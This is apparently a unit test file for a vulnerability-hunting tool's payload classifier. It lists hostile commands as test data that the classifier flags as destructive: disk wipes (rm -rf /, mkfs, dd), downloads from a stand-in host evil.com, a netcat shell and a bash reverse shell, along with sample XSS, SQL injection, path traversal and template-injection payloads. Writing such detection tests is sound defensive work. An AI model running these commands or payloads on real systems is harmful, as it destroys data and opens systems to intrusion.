# Copyright (c) 2026 Ahmed Awad (NullC0d3)
# SPDX-License-Identifier: Apache-2.0
#
# HunterX — AI-Assisted Vulnerability Hunter
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from core.classifier import PayloadClassifier

def test_destructive_patterns():
    c = PayloadClassifier()
    assert c.is_destructive("rm -rf /")
    assert c.is_destructive("mkfs.ext4 /dev/sda")
    assert c.is_destructive("dd if=/dev/zero of=/dev/sda")
    assert c.is_destructive("wget http://evil.com/payload")
    assert c.is_destructive("curl http://evil.com/payload")
    assert c.is_destructive("nc -e /bin/sh")
    assert c.is_destructive("bash -i >& /dev/tcp/evil.com/8080")
    assert not c.is_destructive("SELECT 1")
    assert not c.is_destructive("<script>alert(1)</script>")

def test_classify_file():
    c = PayloadClassifier()
    assert "LFI" in c.classify_file("lfi.txt")
    assert "XSS" in c.classify_file("xss_portswigger.txt")
    assert "SQLI" in c.classify_file("sqli.txt")
    assert "RCE" in c.classify_file("rce.txt")
    assert "SSTI" in c.classify_file("ssti.txt")
    assert "GENERIC" in c.classify_file("unknown_file_type.txt")

def test_classify_payload_content():
    c = PayloadClassifier()
    assert "XSS" in c.classify_payload_content("<script>alert(1)</script>")
    assert "SQLI" in c.classify_payload_content("union select 1,2,3")
    assert "LFI" in c.classify_payload_content("../../etc/passwd")
    assert "SSTI" in c.classify_payload_content("{{7*7}}")

def test_detect_stage():
    c = PayloadClassifier()
    assert c.detect_stage("/etc/passwd", "LFI") == 1
    assert c.detect_stage("../../../../etc/passwd", "LFI") == 1
    assert c.detect_stage(";id", "RCE") == 1
    assert c.detect_stage("{{7*7}}", "SSTI") == 1
    assert c.detect_stage("a" * 100, "LFI") == 3
    assert c.detect_stage("normal payload", "LFI") == 2
